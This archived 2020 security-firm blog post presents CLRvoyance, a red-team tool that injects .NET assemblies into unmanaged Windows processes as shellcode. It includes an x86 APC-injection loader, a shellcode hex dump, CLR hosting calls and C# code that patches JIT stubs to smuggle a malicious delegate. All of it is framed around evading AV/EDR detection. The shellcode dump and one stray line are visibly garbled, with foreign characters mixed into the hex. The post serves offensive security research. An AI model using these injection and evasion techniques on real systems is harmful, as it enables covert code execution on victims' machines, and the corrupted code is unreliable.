<!--
published: 05-13-2020
tags: managed code,clr,josh stone,bryan alexander,native code,accenture security,virtual runtime environment
Archive: https://web.archive.org/web/20210624151714/https://www.accenture.com/us-en/blogs/cyber-defense/clrvoyance-loading-managed-code-into-unmanaged-processes
-->

# CLRvoyance: Loading Managed Code into Unmanaged Processes

May 13, 2020 

The meteoric rise of .NET in public offensive tooling has gradually shifted the tradecraft of red teams. Once dominated by PowerShell, the crowd has diversified its portfolio to embrace .NET as a means of command and control and post-exploitation. This has led to an increase in research and eyes on the foundations of the language and framework, its utility for abuse and fruits of its feature richness. Consequently, Microsoft and blue teams have stepped up their own tradecraft and engineering efforts to increase visibility into the runtime.

With this increased adoption come new techniques and methods of execution, but also the robustness of native portability. Clearly, .NET’s true efficacy is its inherent ability to function as native code in an otherwise managed context. This allows existing code to be easily ported into this new paradigm. With this, however, comes a need to maintain and incorporate existing techniques.

One such technique is remote process injection. At some point in the post-exploitation process, we need to get from process A to process B. In native code, this boils down to:

1.  Open remote process
2.  Allocate memory
3.  Copy code into remote process
4.  Execute native code in remote process

This process is largely unchanged under a managed context, except for stage four.

Briefly, .NET is a framework that executes code in a virtual machine. Therefore, it needs to be interpreted. That means we cannot simply point a CreateRemoteThread at it. Tomes have been written describing both the framework and the common language runtime (CLR) and are referenced below.

With the increased development of .NET tooling, we need some way to exercise these assemblies in the same way. To do that, we need to instantiate the virtual runtime environment, or the CLR.

This post describes instantiation of the CLR and how we can inject managed assemblies into unmanaged processes. Our release of this post and [subsequent tooling](https://github.com/Accenture/CLRvoyance) was in part motivated by conversations with [TheWover](https://twitter.com/TheRealWover), whom we learned had also developed a suite of tools for accomplishing this task (now publicly known as [Donut](https://github.com/TheWover/donut)). While we approached the problem differently, we feel both projects provide valuable contributions. Please check out his post [here](https://thewover.github.io/Introducing-Donut/), as well as the co-author’s sibling [post](https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/).

## Instantiating the CLR

Due to the overwhelming amount of [documentation](https://docs.microsoft.com/en-us/dotnet/standard/clr) and [information](https://devblogs.microsoft.com/premier-developer/managed-object-internals-part-1-layout/) on the [CLR](https://github.com/dotnet/coreclr/tree/master/Documentation/botr), we’ll only briefly touch on this topic and instead focus on the technique and tooling.

In short, the CLR is the virtual machine that executes assemblies targeting .NET and is responsible for interpreting the intermediary language code (CIL, or common intermediate language) and translating it for the CPU. For an in-depth look at the bootstrapping process, check out this [post](https://mattwarren.org/2017/02/07/The-68-things-the-CLR-does-before-executing-a-single-line-of-your-code/). In addition, Microsoft has open sourced a large portion of it, known as [.NET Core](https://github.com/dotnet/runtime). As of version 5, it will have feature parity with the latest version of the .NET framework, providing the ability to generate once and run everywhere.

Most interesting from a consumer perspective is how the CLR can be interfaced with and instantiated. This can be achieved using the [CLR hosting API](https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/), which enables unmanaged applications and scripts to interface with the CLR. Anyone familiar with the component object model (COM) will be familiar with the general workflow. This interface provides, among other things, the ability to start the CLR, load a managed assembly, and execute it.

Several public examples of this already exist. [HostingCLR](https://github.com/etormadiv/HostingCLR) is a great example of the API usage, demonstrating how one might load an assembly from memory and run it from a native context. Cobalt Strike’s [execute-assembly](https://www.cobaltstrike.com/blog/cobalt-strike-3-11-the-snake-that-eats-its-tail) command provides the ability to run a managed assembly in the hosting process and uses a bootstrap DLL to instantiate the CLR and load the assembly. These are great examples for their use cases, but we prefer a more compact method that’s agnostic of code injection techniques, doesn’t require a reflective DLL, and is position independent.

As an example, here’s how the CLR hosting API works:
```
// obtain a handle to CLRMetaHost
_CLRCreateinstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, &pCLRMetahost) :

// get the NET 4.0.30319 runtime
pCLRMetaHost->GetRuntime (L"v4.0.30319", IID_ICLRRuntimeInfo, (void**) &pCLRRuntimeInfo);

// get an interface handle from the COM thunk
pCLRRuntimeInfo->GetInterface (CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (void**) &pCorRuntimeHost);

// start the CLR
pCorRuntimeHost->Start() ;

// create a new AppDomain within this running CLR
pCorRuntimeHost->CreateDomain(L"ChildDomain", null, &pAppDomainThunk);

// get an interface handle from the COM thunk
pAppDomainThunk->QueryInterface(__uuidof(mscorlib::_AppDomain) , (void**) &pAppDomain);

// load an assembly into the newly created AppDomain
pAppDomain->Load_3(pSafeArray, &pAssembly);

// resolve the Main function of the loaded Assembly
pAssembly->get_EntryPoint(&pMethodInfo);

// invoke the main method
mMethodInfo->Invoke_3(obj, pMethodArgs, NULL);
```

This leaves out a lot of the minutia of the process but provides a general overview. Importantly, if the CLR is already instantiated and running during calls to GetRuntime and Start, they will simply return a handle to the already running runtime.

At this point, the CLR is running in the host process, a new AppDomain has been created, an assembly has been loaded and its entry point invoked.

## CLRvoyance

We now turn our attention to executing this in an unmanaged process. As previously described, using a reflective DLL allows for this but is rather cumbersome and inflexible. Instead we’ve chosen to implement our loader entirely in a position-independent assembly. This enables more flexibility in execution and a more compact payload size.
f = open
Our implementation includes x86 and x64 shellcode and a Python script for generating a final payload. Further, we provide a few different flags for more advanced options, which we’ll describe in detail. Our choice to generate shellcode as opposed to a complete package was a simple deferment of responsibility. Our consultants use a variety of injection strategies across languages and contexts; it’s increasingly difficult to manage and support them all. Shellcode gives us a ground floor implementation that’s portable across a variety of scenarios.

This Python script is the main entry point to generating shellcode:

```
$ python clrvoyance.py -h
usage: clrvoyance.py [-h] -a [executable] [-p [32|64]] [-d [net|c]] [-n] [--apc]

options:
  -h, --help       show this help message and exit
  -a [executable]  Assembly
  -p [32|64]       Platform
  -d [net|c]       Dump binary shellcode of assembly
  -n               Load assembly into a new domain
  --apc            Use safe APC shellcode
```

The options should be straight forward. Generating shellcode simply requires we pass in a managed assembly:

```
$ python clrvoyance.py -a calc.exe -p 32
[+] 4096 byte assembly
[+] 1412 byte bootstrap
[+] 5507 byte shellcode written out (calc.exe shellcode)
```

This produces a binary file that can be loaded/run on any Windows machine. We also provide options for producing .NET and C formatted shellcode:

```
$ python clrvoyance.py -a calc.exe.shellcode -d c
"\xe8\x00\x00\x00\x00\x5b\x68\x42\x31\x0е\x00\x68\x88\x4e\x0d\x00"
"\xe8\x2c\x04\x00\x00\x6а\x04\x68\x00\x10\x00\x00\x68\x00\x03\x00"
"\x00\x6а\x00\xff\xd0\x85\xc0\x0f\x84\x4f\x03\x00\x00\x64\x8b\x35"
"\×18\×00\x00\x00\x89\x46\х14\x68\x86\x57\x0d\x00\x68\x88\x4e\x0d*
"\x00\xe8\xfb\x03\x00\x00\x64\x8b\x35\x14\x00\x00\x00\x83\xc6\x38"
"\x89\x06\x8d\xb3\x45\x05\x00\x00\x56\x64\x8b\x35\x14\x00\x00\x00"
"\x83\xс6\x38\xff\x16\x8d\xb3\x39\x05\x00\x00\x56\x64\x8b\x35\x14"
"\x00\x00\x00\x83\xс6\x38\xff\x16\x68\x72\x54\x6b\x00\x68\x88\x8c"
...
```

To use this code, one would simply need to load it into a remote process and trigger execution.

## Shellcode execution modes – asynchronous procedure call (APC)

A core component of remote code injection is the means in which the code runs. Allocating memory and copying code into a remote process is largely the same across many injection techniques, but it’s at the point of execution where things generally vary. Remote threads, APCs, thread contexts and window messages all have their own quirks that manifest in a variety of ways.

In particular, APCs are a common alternative to CreateRemoteThread (CRT), largely because AV/EDR attention to CRT. While it is a popular strategy, we’ve found that many frameworks and tools implement it poorly. In its most common incarnation, tools will hijack an existing thread, spam all threads, or create a suspended thread and queue an APC object. This works but ultimately crashes the thread (or threads). This is largely due to a loss of the EDI register and a context pointer, allocated by ntdll!KiUserApcDispatcher. The enSilo team ran into this during their [AtomBombing](https://github.com/BreakingMalwareResearch/atom-bombing) research and added a [ZwContinue call to their shellcode](https://github.com/BreakingMalwareResearch/atom-bombing/blob/master/AtomBombingShellcode/main.c), which allows context to be restored and previous execution to resume.

In light of these difficulties, we needed shellcode capable of handling APC injection while maintaining the integrity of the original thread, as we generally don’t want to create a suspended one (why CRT if you don’t have to?). This is supported by the --apc flag, which is a separate implementation of our shellcode with APC support and continuation built in. Here is the relevant loader:

```
segment .text
        call geteip
geteip:
        pop ebx

        ; check if WOW64Reserved is null
        mov eax, [fs:0xc0]
        cmp eax, 0
        jne dummy

        ; set EDI for return context under x86
        mov edi, esp
        add edi, 0xc
        mov edi, [edi]

dummy:
        ; setup dummy stack if necessary
        mov eax, [fs:0x18]
        cmp dword [eax+0x1a8], 0
        jne continue
        lea esi, [CONTEXT-geteip+ebx]
        mov dword [eax+0x1a8], esi

continue:
        push KERNEL32_CREATETHREAD_HASH
        push KERNEL32_HASH
        call GetFunctionAddress
        mov esi, ebx
        add esi, execunet
        sub esi, 5
        xor ecx, ecx
        push ecx
        push ecx
        push ebx
        push esi
        push ecx
        push ecx
        call eax

        ; restore PCONTEXT and NtContinue outta here
        push NTDLL_NTCONTINUE_HASH
        push NTDLL_HASH
        call GetFunctionAddress
        push 1
        push edi
        call eax
        ret
```

There are a few important steps here that we’ll address. First is the WoW64Reserved check, which we use to determine if the executing process is WoW64 (x64 -> x86 or WoW64 -> WoW64). If it is, we skip overwriting EDI. If it is not, this means we’re executing in an x86 process and need to restore the register. We need to do this because we’ll be manually calling NtContinue to restore original thread execution and not relying on KiUserApcDispatcher to restore for us. We don’t need to do this when running under WoW64 because it’s handled for us, and ntdll!RtlQueueApcWow64Thread handles masking into RDX.

The second step is a dummy stack for the ActivationContext. This is an important component of Windows [side-by-side](https://docs.microsoft.com/en-us/windows/win32/sbscs/about-side-by-side-assemblies-) (SxS) capabilities. When an executable is compiled, a manifest is embedded that describes the specific version of DLLs or other objects that the executable requires. Without getting too off track here, these contexts allocate stack frames per-thread and are accessible via the ActivationContextStackPointer in the thread environment block (TEB). These contexts are required under certain circumstances and in the case of CLRvoyance, required to be instantiated by the CLR prior to taking over a thread. Setting up an ActivationContext stack frame is not actually required but giving it some stack space is enough for what we need.

Next, we prepare for a call to CreateThread. After much experimentation, we found it easiest to spawn the CLR in another thread than the thread executing our APC. Too many edge case problems, particularly surrounding SxS, needed to be considered and ended up bloating the shellcode.

Finally, after spawning our thread, we need to restore the thread to its previous state before our APC hijacked execution. This is accomplished using the call to NtContinue.

Injection from x86 -> x64 is another can of worms and requires a technique known as [heaven’s gate](https://github.com/darkspik3/Valhalla-ezines/blob/master/Valhalla%20%231/articles/HEAVEN.TXT). This allows x86 code running under WoW64 to execute 64-bit code. However, writing portable code for doing this is outside the scope of this article. Links to some great resources are provided in the appendix.

Note that this CONTEXT juggling only needs to happen under x86. We know x64 has just a single calling convention; all arguments can be passed by register and stored/restored appropriately. No special juggling code is necessary.

## Shellcode execution modes – RX

Another context for shellcode execution is that of read/execute pages. We generally try to avoid pages mapped as RWX (read/write/execute) as it’s yet another additional heuristic for AV/EDR to pick up on. RWX pages, though not uncommon, are becoming increasingly rare in common processing, particularly in the chain of code injection. To combat this, we generally allocate pages as RW, then call VirtualProtect to change page permissions to RX and execute.

Our CLRvoyance shellcode needs to store two things: function addresses and object pointers. We could push these onto the stack, but then we’re dealing with stack shifting. We could also store them in another RW location in memory, such as thread local storage (TLS), but that can trash some legitimate data and have other adverse effects.

In our RWX version of the shellcode, we build function tables (thanks to Didier Stevens for the initial [starting point and inspiration](https://blog.didierstevens.com/programs/shellcode/)):

```
OLEAUT32_FUNCTIONS_TABLE:
OLEAUT32_SAFEARRAYCREATE			dd 0x00000000
OLEAUT32_SAFEARRAYCREATEVECTOR		dd 0x00000000
OLEAUT32_SAFEARRAYACCESSDATA		dd 0x00000000
OLEAUT32_SAFEARRAYUNACCESSDATA		dd 0x00000000
```

At runtime we populate these with pointers to the functions. In an RX page, however, we won’t be able to write to the table, so we must move it elsewhere. Additionally, we need to maintain object pointers throughout the course of execution. To support this in an RX page, we simply VirtualAlloc some writable memory and use this memory chunk to store all pointers.

Next we need to stash the buffer pointer somewhere we can fetch for reference. We chose to use the ArbitraryUserPointer field in the TEB, as we found this to be unused during execution and relatively untouched outside of WoW64 and a few other isolated instances:

```
mov esi, [fs:0x18]
mov [esi+0x14], eax
```

Accessing our writable chunk of memory is now simply:

```
%macro GET_TLS_VAR 1
    mov esi, [fs:0x14]
    add esi, %1
%endmacro
```

And using it to call LoadLibrary:

```
; LoadLibrary(oleaut32.dll)
lea esi, [OLEAUT32DLL-geteip+ebx]
push esi
GET_TLS_VAR 0x38
call [esi]
```

This makes it extremely simple to work with and extend.

## Assembly inception

Another interesting challenge we encountered when bootstrapping assemblies from shellcode is loading a running assembly in a separate [AppDomain](https://docs.microsoft.com/en-us/dotnet/framework/app-domains/application-domains). It is desirable to separate payloads using the AppDomain abstraction, as it facilitates repeated execution of different assemblies without leaking memory – all AppDomain resources are successfully purged when the AppDomain is destroyed, whereas loading all assemblies into one AppDomain leaves them in memory in perpetuity.

Creating an AppDomain is simple:

```
AppDomain child = AppDomain.CreateDomain("ChildDomain");
```

But we need to add code to that domain and invoke it. The canonical solution is to create a proxy object that inherits from MarshalByRefObject, instantiate it in the child AppDomain and call its functions through a proxy reference in the parent AppDomain. Our scenario makes this problematic. To instantiate the proxy object, the proxy object’s class must be known to the other domain. This requires that the class’s containing assembly be loaded into that domain; it must be resolved by name.

The CLR has a hierarchy of trust for assemblies and primarily expects them to come from files. Assemblies can be loaded from byte arrays, but these are loaded as “no context” assemblies and cannot easily be used across AppDomain boundaries without extra effort. Since our parent assembly has itself been loaded from memory, it cannot be resolved by name. When we send our proxy object to the child AppDomain, the CLR attempts to resolve its class, leading to its containing assembly, which cannot be loaded by name from disk. The result is a FileNotFound exception and the inability to instantiate the proxy object.

Another option is to avoid the proxy object approach and instead directly load an assembly into the target AppDomain. This presents several challenges, which we will discuss here. It’s easy enough to load an assembly into an AppDomain, like so:

```
var asm = new byte[] { ... };
child.Load(asm);
```

But when you go to do this, your program will still throw a FileNotFound exception! Misinformation abounds on the Internet as to the cause of this exception – it is in fact different from our previous scenario with the proxy object. The reference to the AppDomain is legitimates and calling the Load() method works just fine – the assembly is loaded into that AppDomain successfully. This can be proven by watching the process in WinDBG and listing assemblies.

The issue is that AppDomain.Load() returns a value – specifically, a reference to the loaded assembly. This return value must be serialized into the calling AppDomain. It is this process that fails with the FileNotFound exception. Assemblies are serialized by either finding the same assembly in the recipient AppDomain (if already loaded), or loading it afresh – in either case, it is identified by name. Unfortunately for our purposes, only assemblies in the “Load” context can be resolved by name – “no context” assemblies cannot be. So, when the CLR goes to serialize this return value, it cannot find it on disk in the proper locations and throws an exception.

But loading it in the calling AppDomain is exactly what we don’t want anyway – if it did it this way, then every time we attempt to load a disposable assembly in another AppDomain, it would pollute our primary AppDomain and result in leakage. But the salient point is that the assembly has in fact been loaded in the child domain, as we desired, so the simplest solution is just to ignore the exception:

```
try { 
	child.Load(asm); 
} 
catch (Exception) {

}
```

So we have now loaded our assembly into the child AppDomain and our process hasn’t died, so everything’s looking pretty good. But how do we invoke code in that injected assembly? We can’t use any proxy objects, because they must be marshaled across the AppDomain boundary. Since that’s Microsoft’s preferred way of doing things, we will need to subvert the CLR a little bit to get what we want.

The proxy object approach uses AppDomain.CreateInstanceAndUnwrap() to get an object proxy. This isn’t available to us because of the aforementioned assembly resolution issues. But there’s another interesting method: AppDomain.DoCallBack(). This method consumes delegates, and delegates can be serialized between AppDomains as long as the function they wrap can be resolved.

For example, the following code can run a function in the child AppDomain and produce no ill assembly resolution issues:

```
var call = new CrossAppDomainDelegate(Console.Beep);
child.DoCallBack(call);
```

In our testing, we found a way to manipulate this process to run a delegate that cannot be resolved in the target AppDomain, which makes it possible to achieve our ultimate goal: smuggling delegates. Our present objective is to call a delegate in the target AppDomain that resides in an unresolvable assembly. We create two delegates – one that can be successfully resolved and thus marshaled into the child AppDomain and the other containing malicious code in our memory-injected assembly:

```
var Sleevew = new CrossAppDomainDelegate(Console.Beep);
var Ace = new CrossAppDomainDelegate(ActivateLoader);
```

The ActivateLoader() method carries out our malicious task; this will be described later. For now, understand that it can’t be called directly in the child AppDomain because it lives in a “no context” assembly. But we can ask the JIT to compile these two delegates and then patch the former so that, when called, it jumps directly to the latter. First, compile the delegates:

```
RuntimeHelpers.PrepareDelegate(Sleeve);
RuntimeHelpers.PrepareDelegate(Ace);
```

Now obtain addresses for the JIT stubs that call into these functions. We can simply use reflection to grab private fields:

```
var flags = BindingFlags.Instance | BindingFlags.NonPublic;
var codeSleeve = (IntPtr)Sleeve.GetType().GetField("_methodPtrAux", flags).GetValue(Sleeve);
var codeAce = (IntPtr)Ace.GetType().GetField("_methodPtrAux", flags).GetValue(Ace);
```

In some cases the JIT stub may reside in writable memory, but testing showed that this is not always true. So for completeness, we need to mark it writable, patch the code with “mov rax, &delegate; jmp rax” – where &delegate is the address of our malicious delegate’s stub:

```
VirtualProtect(codeSleeve, new UIntPtr(12), 0x4, out perms);
Marshal.WriteByte(codeSleeve, 0x48);
Marshal WriteByte(IntPtr.Add(codeSleeve, 1), 0xb8);
Marshal.WriteIntPtr(IntPtr.Add(codeSleeve, 2), codeAce);
Marshal.WriteByte(IntPtr.Add(codeSleeve, 10), 0xff);
Marshal.WriteByte(IntPtr.Add(codeSleeve, 11), 0xe0);
VirtualProtect(codeSleeve, new UIntPtr(12), perms, out perms));
```

With this code patch in place, when we call AppDomain.DoCallBack() the child AppDomain will end up calling the compiled code for our malicious delegate. There are some important caveats, though. Any code in this delegate that triggers AppDomain / assembly validation will cause an exception, owing to the fact that this smuggled delegate comes from an unresolvable assembly. So this delegate needs to be written such that it does simple, innocuous things. But it’s not too hard to accomplish our overall goal using this approach.

We already loaded our assembly in the child domain, so the delegate just needs to find that assembly and do something with it, which turns out to be another simple bit of reflection. Our smuggled delegate calls the ActivateLoader() method, which looks something like this:

```
private static void ActivateLoader()
{
	foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
	{
		if (asm.FullName.Contains("InjectedAssembly"))
		{
			var type = asm.GetType("Loader.Loader");
			var foo = Activator.CreateInstance(type);
		}
	}
}
```
Assuming that our injected assembly is named “InjectedAssembly,” it can be found in the enumeration of assemblies in the AppDomain. This code simply loops through that list, finds the right one and instantiates an object. It is up to the operator to build in the desired functionality in that object’s constructor.

At this point we have successfully injected a “no context” assembly into an AppDomain, all from another “no context” assembly and can invoke its functionality. This way, our entire process resides entirely in memory and allows us to make use of the AppDomain boundary abstraction for safety.

## Conclusion

Continued adoption of the .NET framework for offensive tooling will continue to shape the landscape of open source tooling and tradecraft. With CLRvoyance, we’ve demonstrated that .NET payloads can be made portable and endlessly adaptable to varying conditions of execution.

We’ve open sourced CLRvoyance on our Github [here](https://github.com/Accenture/CLRvoyance) and will continue to support it with additional features and fixes as they roll in. We’d like to additionally thank TheWover and modex for their contributions to this space and for motivating us to release CLRvoyance publicly!

## Accenture Security

Accenture Security is a leading provider of end-to-end cybersecurity services, including advanced cyber defense, applied cybersecurity solutions and managed security operations. We bring security innovation, coupled with global scale and a worldwide delivery capability through our network of Advanced Technology and Intelligent Operations centers.Helped by our team of highly skilled professionals, we enable clients to innovate safely, build cyber resilience and grow with confidence. Follow us [@AccentureSecure](https://twitter.com/AccentureSecure) on Twitter or visit us at [www.accenture.com/security](http://www.accenture.com/security).

The opinions, statements, and assessments in this article are solely those of the individual author(s) and do not constitute legal advice, nor do they necessarily reflect the views of Accenture, its subsidiaries, or affiliates. This document is produced by consultants at Accenture as general guidance. It is not intended to provide specific advice on your circumstances. If you require advice or further details on any matters referred to, please contact your Accenture representative.

## Authors

- Bryan Alexander, Research & Development Lead
    - Bryan is the R&D Lead for the FusionX group, providing research-driven tool and exploit development.
- Josh Stone, Senior Researcher
    - Josh is a Senior Researcher for the Advanced Attack and Readiness group, focused on command and control technologies and tooling.

Copyright © 2020 Accenture. All rights reserved. Accenture, and its logo are trademarks of Accenture.
